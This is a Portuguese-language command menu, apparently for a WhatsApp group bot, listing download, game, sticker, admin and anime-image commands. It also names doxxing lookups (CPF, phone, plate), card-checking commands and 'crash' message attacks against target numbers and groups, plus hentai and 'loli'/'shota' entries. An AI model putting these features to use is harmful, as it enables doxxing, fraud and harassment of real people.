║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytsearch (NOME) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytmp4 (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytmp3 (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tiktok (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Instagram (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Facebook (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Twitter (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Imgpralink (MARCAR)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videopralink (MARCAR-V) 
║
╠┄┄┄⟨👻𝐉 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}eununca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ppt (PEDRA/PAPEL/TESOURA) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Jogodavelha (@MARCAR) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ttt (JOGO-DA-VELHA) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Cassino
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Quizanimais 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anagrama 1 / 0
║
╠┄┄┄⟨👻𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp2 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp3 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp4 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp5 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp6 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp7 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp8 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp9 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp10 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ttp (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fsticker (MARCAR-FOTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Sticker (MARCAR-FOTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Toimg (MARCAR-FIGU)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Togif (MARCAR-FIGU)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Roubar (TEXT/TEXT)
║
╠┄┄┄⟨👻𝐂𝐌𝐃𝐒/𝐁𝐀𝐒𝐈𝐂𝐎𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gtts (LINGUAGEM + TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Traduzir Hello 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tagme 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Emoji
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Emojimix
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tabela (LETRAS) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Conselhobiblico
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Google 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Printsite
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clima (SUA CIDADE)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clima2 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mercadolivre
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ia (FAÇA UMA PERGUNTA)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simi (FALE-ALGO)  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Perfil
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Calcular (1 + 1)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fazernick (NICK)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bot
║
╠┄┄┄⟨👻𝐌𝐄𝐍𝐔 𝐀𝐃𝐌👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Kick [@] (pra-remover) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ban (responder-mensagem)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Promover [@] (Ser-ADM)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rebaixar [@] (rebaixar-adm)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Totag (menciona-algo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grupo f/a
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Status
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Limpar (texto-invisível-gp)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Atividades (DO-GRUPO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Linkgp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grupoinfo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Hidetag (txt) (marcação)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marcar (marca tds do gp)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marcar2 (Marca-tds-Wa.me/)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anagrama 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Autofigu 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antidocumento 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antipalavra 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiloc 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anticontato 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antilink 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antilinkhard 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}AntiCatalogo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antifake 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bemvindo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiimg 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiaudio 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antivideo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Leveling 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simih 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simih2 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Descgp (TXT)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Nomegp (Nome)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Criartabela (ESCREVA-ALGO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tabelagp
║
╠┄┄┄⟨👻𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videolento (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videorapido (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videocontrario (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Audiolento (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Audiorapido (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grave (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grave2 (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Esquilo (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Estourar (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bass (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bass2 (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Vozmenino (marca)
║
╠┄┄┄⟨👻𝐇 𝐄 𝐍 𝐓 𝐀 𝐈 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}foot
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gangbang
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jahy
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glasses
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}masturbation
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cuckold
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ero
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cum
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}femdom
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}masturbation
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}femdom
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ahegao
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bdsm
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blowjob
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pussy
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nsfwneko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tentacles
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thinghs
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yuri
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}zettairyouiki
║
╠┄┄┄⟨👻𝐀 𝐏 𝐏 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}aap4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app8 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app12
║
╠┄┄┄⟨👻𝐉 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo30
╠┄┄┄⟨👻𝐀 𝐍 𝐈 𝐌 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shota
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}waifu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}loli2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yotsuba
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shinomiya
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yumeko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tejina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chiho
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}boruto
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kaori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shizuka
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kaga
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kotori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mikasa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}akiyama
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gremory
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}isuzu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kagura
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shinka
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}eba
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}elaina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}erza
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hinata
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}minato
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}naruto
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sagiri
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nezuko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}rize
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}deidara
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yuki
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ana
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}asuna
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ayuzawa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chitoge
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}emilia
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hestia
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}inori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}itachi
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}madara
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sakura
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sasuke
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tsunade
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}onepiece
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mobil
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}montor
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}keneki
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}megumin
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}toukachan
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}itori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kurumi
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sakurajima
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}miku
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pokemon
║
╠┄┄┄⟨👻𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cyberspace
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gamer
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}satanic
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}wallpaperanime
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}aesthetic
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ppcouple
║
╠┄┄┄⟨👻𝐒 𝐄 𝐑 𝐈 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie30
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie31
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie32
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie33
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie34
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie35
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie36
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie37
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie38
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie39
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie40
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie41
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie42
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie43
║
╠┄┄┄⟨👻𝐄 𝐃 𝐈 𝐓 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hunteredits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}spyxfamilyedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}narutoedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}onepieceedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nanatsuedits
╠┄┄┄⟨👻𝐅 𝐈 𝐋 𝐌 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme30
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme31
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme32
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme33
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme34
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme35
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme36
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme37
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme38
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme39
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme40
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme41
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme42
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme43
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme44
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme45
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme46
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme47
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme48
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme49
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme50
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme51
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme52
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme53
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme54
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme55
║
╠┄┄┄⟨👻𝐏𝐔𝐗𝐀𝐃𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nome
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}placa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bin
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}store
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}vizinhos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chk
╠┄┄┄⟨👻𝐓𝐑𝐀𝐕𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashcarrinho
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashaudiobug
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashconvite
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashliveloc
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}matargp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}travacrash [@ ou numero sem + e sem espaço]
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashwebpag
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashloc
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashfig
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashcatalogo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashpythonbug 
║
╠┄┄┄⟨👻𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gay (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Feio (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Corno (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Vesgo (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bebado (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gostoso (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gostosa (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Beijo (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Matar (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tapa (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Chute (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Dogolpe (marca (@))   
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Nazista (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Chance (fale algo) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Casal   
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgay     
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgado
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankcorno  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgostoso
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgostosa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ranknazista
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankotakus
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankpau
║
╠┄┄┄⟨👻𝐌 𝐄 𝐒 𝐓 𝐑 𝐄👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fotomenu (marca-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blockcmd  (cmd)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unblockcmd (cmd)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendabv (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendasaiu (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendasaiu2 (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendabv2 (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}prefixo_tipo2 simbolo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}prefixo_tipo_off
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fundobemvindo (marcar-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fundosaiu (marcar-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serpremium
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}listagp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipalavrão 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antiligar 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipv 1 / 0 (esse da block)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}addpalavra (palavrão)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}delpalavra (palavrão)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipvon
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipvoff
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ativo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ausente (fale-oq-faz)
